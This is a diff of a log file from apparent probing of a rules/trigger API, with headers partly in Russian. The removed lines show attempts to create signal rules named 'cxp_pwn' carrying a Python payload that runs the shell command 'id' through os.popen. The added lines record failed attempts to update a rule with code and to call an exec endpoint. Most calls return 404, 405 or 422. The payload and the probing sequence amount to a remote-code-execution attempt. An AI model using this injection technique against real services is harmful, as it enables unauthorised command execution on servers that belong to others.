@@ -1,41 +1,6 @@
-=== CREATE SIGNAL RULE (правильная структура) ===
-CURRENT RULES: {
- "items": [
-  {
-   "id": 1,
-   "uuid": "ec96a6b6-8d16-420d-bbf8-15bc27f802aa",
-   "name": "cxp-test",
-   "description": null,
-   "typeName": null,
-   "codeType": "python",
-   "conditionCode": null,
-   "conditionType": "expression",
-   "conditionExpr": null,
-   "trigger": {
-    "type": "manual"
-   },
-   "executionType": "action",
-   "executionParams": {},
-   "priority": 0,
-   "isActive": true,
-   "timeoutSeconds": 30,
-   "cronSchedule": null,
-   "cronTimezone": "UTC",
-   "nextTriggerAt": null,
-   "lastFiredAt": null,
-   "createdAt": "2026-09-09 15:12:50.845505+00:00",
-   "updatedAt": "2026-09-09 15:12:50.845505+00:00"
-  },
-  {
-   "id": 2,
-   "uuid": "f33ac08a-7179-471d-8be8-43b8d37bf579",
-   "name": "cxp-test2",
-   "description": null,
-   "typeName": null,
-   "codeType": "python",
-   "con
-CREATE cxp-signal: 201 b'{"id":4,"uuid":"763ff4d5-383e-4809-81e7-63ea13ffcdd8","name":"cxp-signal","description":null,"typeName":null,"codeType":"python","conditionCode":null,"conditionType":"expression","conditionExpr":null,"trigger":{"signalName":"cxp_pwn","type":"signal"},"executionType":"action","executionParams":{},"pr'
-CREATE cxp-sig2: 422 b'{"error":"ValidationError","detail":[{"type":"missing","loc":["body","trigger"],"msg":"Field required","input":{"name":"cxp-sig2","signalName":"cxp_pwn2","code":"import os; result=os.popen(\'id\').read('
-FIRE cxp_pwn: 404 b'{"error":"HTTPException","detail":"No signal rule found for \'cxp_pwn\'"}'
-FIRE cxp_pwn2: 404 b'{"error":"HTTPException","detail":"No signal rule found for \'cxp_pwn2\'"}'
-SIGNAL-RULE
+=== UPDATE RULE 4 с кодом + FIRE ===
+UPDATE: 404 b'{"error":"HTTPException","detail":"Trigger \'4\' not found"}'
+FIRE: 404 b'{"error":"HTTPException","detail":"No signal rule found for \'cxp_pwn\'"}'
+FIRE: 404 b'{"error":"HTTPException","detail":"No signal rule found for \'cxp_pwn\'"}'
+EXEC-CREATE: 405 b'{"error":"HTTPException","detail":"Method Not Allowed"}'
+RULE-EXEC
